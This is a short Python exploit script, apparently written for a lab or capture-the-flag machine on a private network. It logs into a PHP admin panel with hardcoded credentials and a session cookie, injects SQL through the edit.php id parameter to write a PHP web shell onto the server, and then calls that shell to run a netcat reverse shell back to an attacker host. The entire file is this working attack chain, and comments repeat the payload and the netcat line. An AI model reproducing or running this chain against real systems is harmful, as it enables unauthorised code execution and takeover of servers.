# importing the requests library 
import requests 
import socket
import http.server
import socketserver
import threading
import time
from urllib.parse import urlparse
from urllib.parse import parse_qs

cookie = "qgagkuro6r4b27q1b9dqae1ua0"
# api-endpoint 
URL = "http://192.168.106.145/admin/index.php"
PARAMS = {
    'user':'test', 
    'password' : 'noob',
}

cookies = {
    "PHPSESSID" : cookie
}

r = requests.post(URL, cookies=cookies, data = PARAMS)

#print(r.status_code)
#print(r.text)

print("Request sent to admin panel\n")

authString = "Write a new post</a>"
if authString in r.text:
    print("auth success, send payload!\n")
    auth = 1
else:
    print("auth failed\n")
    auth = 0

if (auth == 1):
    URL = "http://192.168.106.145/admin/edit.php?id=0%20UNION%20SELECT%201,2,3,%20'%3C?php%20system($_GET%5B%5C'c%5C'%5D);%20?%3E'%20INTO%20OUTFILE%20'/var/www/css/shell.php'"
    PARAMS = {
        'user':'test', 
        'password' : 'noob',
    }

    r = requests.get(URL, cookies=cookies)
    print(r.text)


print("RCE achieved, lets get shell!\n")
URL = "http://192.168.106.145/css/shell.php?c=nc -e /bin/sh 192.168.106.148 443"
r = requests.get(URL, cookies=cookies)
#nc -e /bin/sh 10.0.0.1 1234


#UNION SELECT 1,2, '<?php system($_GET[\'c\']); ?>', 4 INTO OUTFILE '/var/www/css/shell.php'

#don’t put \ in front of the other ' because they mean different things. the \ is to escape the quote char INSIDE a string

  
